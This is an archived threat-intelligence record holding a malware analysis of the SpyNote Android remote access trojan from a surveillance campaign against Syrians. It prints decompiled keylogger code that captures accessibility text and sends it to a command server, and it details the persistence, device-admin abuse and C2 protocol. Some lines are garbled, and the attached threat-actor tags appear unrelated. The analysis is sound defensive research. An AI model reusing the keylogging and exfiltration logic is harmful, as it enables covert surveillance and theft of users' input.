{
    "id": "ad6c2272-c7b0-41a7-be2f-face15f4944a",
    "created_at": "2023-01-12T15:04:33.568281Z",
    "updated_at": "2025-03-27T02:16:25.569362Z",
    "deleted_at": null,
    "sha1_hash": "df5f6f27a799fc34d2344cdebcb2fd1d5ce2a69d",
    "title": "2020-07-15 - An in-depth analysis of SpyNote remote access trojan",
    "authors": "",
    "file_creation_date": "2022-05-27T23:09:28Z",
    "file_modification_date": "2022-05-27T23:09:28Z",
    "file_size": 2118736,
    "plain_text": "# An in-depth analysis of SpyNote remote access trojan\n\n**bulldogjob.pl/articles/1200-an-in-depth-analysis-of-spynote-remote-access-trojan**\n\n[Techniczne](https://bulldogjob.pl/readme/s/categories,tech)\n\n\nLookout [researchers have recently discovered a surveillance campaign targeting Syrian citizens and it is believed that the actor behind the](https://blog.lookout.com/nation-state-mobile-malware-targets-syrians-with-covid-19-lures)\nattack was state-sponsored. The campaign had been active since January 2018 and its goal was to infect Android mobile devices with remote\naccess trojans (RATs) and then spy on people in possession of those devices.\n\nThe victims were tricked into downloading and installing innocent-looking mobile applications which were actually spyware. The applications\nwere shared through various communication channels; however, they were never available on the official Google Play Store. Some\napplications attempted to masquerade as legitimate ones like Telegram, others were COVID-19 contact tracing apps or benign tools like a fake\ndigital thermometer, and others impersonated Android built-in tools. The common factor was that all of them had an additional functionality:\nallowing the adversary to spy on the users who installed them.\n\nIn this article we will examine the internal workings of one of those applications to analyze its capabilities and understand how it is used by the\nthreat actors.\n\n## What is a remote access trojan (RAT)?\n\n[A Remote Access Trojan (RAT) is a type of malware that controls a system through a remote network connection. A RAT is typically installed](https://blog.malwarebytes.com/threats/remote-access-trojan-rat/)\nwithout the victim's knowledge, often as payload of a trojan horse program, and will try to hide its operation from the victim and from security\nsoftware and other anti-virus software.\n\nA RAT enables its operators to perform many activities on the compromised device (e.g. control a device's camera, access its storage,\nintercept calls and text messages, etc.). This is all done via an easy-to-use application hosted on a command and control server.\n\n## Executive summary\n\nA sample Android application was chosen for analysis from a pool of 71 malicious ones reported by Lookoutâ€™s research. The sample examined\nis an instance of the SpyNote RAT.\n\nChosen application details:\n\n\n-----\n\nAfter the application is installed, it is displayed as Android with the icon resembling the one of the built-in Android applications `Settings .`\n\n_Malware icon_\n```\nAndroidManifest.xml file reveals that malware takes advantage of a number of permissions, allowing it to have, among others, the\n\n```\nfollowing capabilities:\n\ntrack location of the device (GPS and network-based)\nmake and intercept calls\naccess camera\naccess external storage\naccess contact list\nread SMS\naccess microphone\ndisplaying content over other applications\n[clickjacking via Accessibility Services](https://www.makeuseof.com/tag/android-accessibility-services-can-used-hack-phone/)\n\n## Technical details\n\n\n-----\n\ne t e d st but o c a e o t e app cat o sa p e e a s u o, t as su e y e e a a ab e o t e o c a Goog e ay Sto e\nMost likely, the malware was spread via other means like a spearphishing attachment or a link.\n\nA SpyNote client can masquerade as legitimate application. Static code analysis indicates that the malware, after successful installation, would\ninstall a legitimate application embedded in the APK file at `res/raw/google.apk . Also, screenshots of cracked` [SpyNote server v6.4.4](https://www.youtube.com/watch?v=zJXk4FCHx_0)\nproves that functionality:\n\n_APK builder_\n\nThe adversary can pick a name of the application, service, its version, and the name of a victim to be able to differentiate them. This value can\nbe extracted from the res/values/strings.xml file. In this particular example they were set as follows:\n```\n<string name=\"n\">Hamody</string> <!-- Victim Name -->\n<string name=\"app_name\">Android</string> <!-- App Name -->\n<string name=\"s\">Android</string> <!-- Service Name -->\n<string name=\"v\">6.4.4</string> <!-- Version -->\n\n```\nThis sample did not include any additional applications and the file `res/raw/google.apk was empty.`\n\n_google.apk file details_\n\nIt was left was so that the malware, when executed, simply loads the legitimate `android.settings.ACCESSIBILITY_SETTINGS intent:`\n\n\n-----\n\n_Accessibility intent_\n\n_Code running accessibility intent_\n\nAndroid applications, including malware, can listen for the BOOT_COMPLETED broadcast event to ensure the application will be activated\nupon device start up, and this is the technique that SpyNote utilizes to achieve its persistence mechanism. As per the `AndroidManifest.xml`\nfile, the class that is receiving the `BOOT_COMPLETED event is` `com.android.tester.C4 :`\n```\n<receiver android:name=\"com.android.tester.C4\" android:enabled=\"true\" android:exported=\"true\">\n <intent-filter>\n  <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\n </intent-filter>\n</receiver>\n\n```\nThis class waits for the `BOOT_COMPLETED broadcast, checks if the` `com.android.tester.C11 service is already running, and, if not, initiates`\nit. The service is responsible for processing commands received from the C2 server and is also the class where most of the code resides.\n\n_com.android.tester.C4 class_\n\n_code_\n\n\n-----\n\nSpy ote s ab e to d sco e sta ed app cat o s, so t at t e attac e s ca te c secu ty app a ces a e dep oyed to a de ce easo\nfor collection of the list of applications may be to discover high value applications like banking or messaging software. Application discovery is\nachieved by using the `PackageManager class:`\n\n_Application discovery code_\n\nThe above code not only extracts names of the installed applications, but also their installation dates and icons. This is what the operators\ncontrolling the device see:\n\n_List of extracted applications_\n\nThere is a large quantity of other data that malware extracts, most likely for the operators to be able to easily tell that it is running in a virtual\nmachine. The following are main information categories that the adversary takes advantage of:\n\ndevice\nsystem\nSIM\nWiFi\naudio\nBluetooth\nlocation\n\n\n-----\n\nFor most Android Virtual Devices (AVDs), the data above will not vary too much by default and it is more than enough information to determine\nwhether the infected system is a real mobile device or an emulator.\n\n_Extracted device information_\n\n[It can also be seen on the footage that the tool embedded in SpyNote's C2 can be used to generate APKs. It is highly customizable and allows](https://www.youtube.com/watch?v=zJXk4FCHx_0)\nthe attacker to choose whether the application should be hidden or not. Other possibilities include enabling key logging, device administration,\nleveraging SuperSU if the device is rooted, and deactivating icons.\n\n_SpyNote APK builder_\n\nSpyNote operators can use Device Administrator access to wipe data, lock it, or reset the password:\n\n_Device Administrator actions_\n\n\n-----\n\nSpy ote a es use o t e access b ty by o e d g o `ccess b` `ty` `e t` et od to og eyst o es e ogs a e sa ed to e te a\nstorage to file configdd-MM-yyy.log where dd-MM-yyyy is the date of when the keystrokes were captured. The data can then be downloaded\nby the malware operators.\n```\npublic void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) { \n    try { \n      String a = m1819a(accessibilityEvent); // accessibilityEvent.getText().toString(); \n      String str = (String) accessibilityEvent.getPackageName(); \n      StringBuilder sb = new StringBuilder(); \n      if (a.startsWith(\"[\") && a.endsWith(\"]\")) { \n        a = a.substring(1, a.length() - 1); \n      } \n      if (!this.f1163b.equals(a)) { \n        this.f1163b = a; \n        if (str != null && a.length() != 0) { \n          String format = new SimpleDateFormat(\"HH:mm a\", Locale.ENGLISH).format(new Date()); \n          String str2 = new String(\"-1\"); \n          if (getApplicationContext().getResources().getString(R.string.gp).charAt(2) == '0') { \n            // redacted application icon extraction \n          } \n          if (str != null && a != null && format != null) { \n            if (C11.f1164A) { \n              C11.m1858a(C11.m1851a(C11.f1181m, 50) + C11.f1175f + C11.m1851a(C11.f1181m, 115) + C11.f1175f + str2 +\nC11.f1177h + a + C11.f1177h + str + C11.f1177h + format); // send to C&C \n            } \n            sb.append(str2 + C11.f1177h + a + C11.f1177h + str + C11.f1177h + format + C11.f1176g); \n            String string2 = getApplicationContext().getResources().getString(R.string.s); \n            if (\"mounted\".equals(Environment.getExternalStorageState())) { \n              File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + \"/\" +\nstring2.trim()); \n              if (!file.exists()) { \n                file.mkdirs(); \n              } \n              try { \n                String format = new SimpleDateFormat(\"dd-MM-yyyy\", Locale.ENGLISH).format(new Date()); \n                String string = getApplicationContext().getResources().getString(R.string.s); \n                File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + \"/\" +\nstring.trim()); \n                if (file.exists()) { \n                  FileWriter fileWriter = new FileWriter(file.getPath() + \"/config\" + format + \".log\", true); \n                  fileWriter.write(sb.toString()); \n                  fileWriter.close(); \n                } \n              } catch (IOException unused) { \n              } \n            } \n          } \n        } \n      } \n    } catch (Exception unused) { \n    } \n  }\n\n```\nThe spyware has a File Manager feature allowing access to files like application data, pictures, downloads, and others, that are kept in the\nexternal storage:\n\n\n-----\n\n_File Manager feature code_\n\n_File Manager as seen by the attackers_\n\nSpyNote has a location tracking feature based on GPS and network data. The location data is obtained by registering `LocationListener`\nusing `requestLocationUpdates method from` `LocationManager class.`\n\nMoreover, a remote command can be issued to capture audio or camera feed. The code is designed to allow live footage to be obtained from\nall cameras available on a device with additional capabilities like zoom, flash etc.\n\n\n-----\n\n_Audio recording code_\n\nThe collected data exfiltration is achieved over the command and control channel. All commands and data are sent via the normal\ncommunications channel. All traffic sent by a victim's device is compressed before being sent using java.util.zip.GZIPOutputStream class:\n\n_Data compression code_\n\nCommand and control (C2, C&C) traffic is sent over an uncommonly used port tcp/215, but it is also possible for SpyNote to communicate via\nany other TCP port. The IP address and port are chosen during the APK building process:\n\n_C2 server configuration_\n\nSpyNote uses a custom TCP protocol for C&C communications:\n\n\n-----\n\n_SpyNote protocol visualization_\n\nThe traffic always starts with the payload size followed by a 0x00 null byte. The payload from a victim to the C2 server is always GZIP\n**DEFLATE-compressed and, thus, starts with** [0x1f8b08 bytes.](https://tools.ietf.org/html/rfc1952#section-2.2)\n\nThe above payload was the initial one sent to the C2 and can be easily decompressed:\n\n$ echo\n\"1f8b0800000000000000ad56c9d6ab380e7e957f559b2c98032c0d98314098033b8600614e026178fa22b953dfdb7d4ed7a2744e6c7db290654976\n| xxd -r -p | zcat\n1025310249null10249100&false10249w410249510249null &\nnull10249/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAAB\nAndroid SDK built for x861024910 & 2910249f60598b565b235cd102491024910248null\n\nThe above [base64 string is an encoded JPG file containing a part of the device's screen:](https://tools.ietf.org/html/rfc4648)\n\n_Extracted part of the device screen_\n\nAfter the initial payload is sent to the C2 server, the beaconing activity between the device and the C&C server begins:\n\n_Beaconing traffic_\n\nThe server sends 35 00 70 6f 69 6e 67 which is similar to the described protocol above:\n\n0x35 - payload size (5 ASCII)\n0x00 - null byte\n0x706f696e67 - poing in ASCII\n\nThe victim responds with:\n\n\n-----\n\n0 333300 8b0800000000000000 b 8cd d303 303 b c8 bcdc90 00 d3 eed0d000000\n\n0x3333 - payload size (33 ASCII)\n0x00 - null byte\n0x1f8b08000000000000002b28cd2d30343032b1c82bcdc901007d342eed0d000000 - GZIP compressed string pump10248null\n\n## Conclusion\n\nAnalysis of the SpyNote sample indicates that the threat actors behind the surveillance campaign had extensive control over victims' devices.\nNot only does this piece of malware have considerable features, but it is also highly customizable to evade detection and deceive victims into\ndownloading, installing, and providing full access to their devices. Having that in mind, it should not be surprising that the adversary was able\nto run the campaign for over a dozen years. It is also clear that users should be educated not to install mobile applications from non-official\napplication stores. Moreover, Device Administrator privilege should only be granted to, if any, trusted applications.\n\n## Detection\n\n### Indicators of compromise (IOCs)\n\n MITRE ATT&CK Techniques\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-07-15 - An in-depth analysis of SpyNote remote access trojan.pdf"
    ],
    "report_names": [
        "2020-07-15 - An in-depth analysis of SpyNote remote access trojan.pdf"
    ],
    "threat_actors": [
        {
            "id": "caf95a6f-2705-4293-9ee1-6b7ed9d9eb4c",
            "created_at": "2022-10-25T15:50:23.472432Z",
            "updated_at": "2025-03-27T02:00:55.479021Z",
            "deleted_at": null,
            "main_name": "Confucius",
            "aliases": [
                "Confucius",
                "Confucius APT"
            ],
            "source_name": "MITRE:Confucius",
            "tools": [
                "WarzoneRAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "7a8dbc5e-51a8-437a-8540-7dcb1cc110b8",
            "created_at": "2022-10-25T16:07:23.482856Z",
            "updated_at": "2025-03-27T02:02:09.827887Z",
            "deleted_at": null,
            "main_name": "Confucius",
            "aliases": [],
            "source_name": "ETDA:Confucius",
            "tools": [
                "ApacheStealer",
                "ByeByeShell",
                "ChatSpy",
                "Confucius",
                "MY24",
                "Sneepy",
                "remote-access-c3",
                "sctrls",
                "sip_telephone",
                "swissknife2"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535873,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1653692968,
    "ts_modification_date": 1653692968,
    "files": {
        "pdf": "https://archive.orkl.eu/df5f6f27a799fc34d2344cdebcb2fd1d5ce2a69d.pdf",
        "text": "https://archive.orkl.eu/df5f6f27a799fc34d2344cdebcb2fd1d5ce2a69d.txt",
        "img": "https://archive.orkl.eu/df5f6f27a799fc34d2344cdebcb2fd1d5ce2a69d.jpg"
    }
}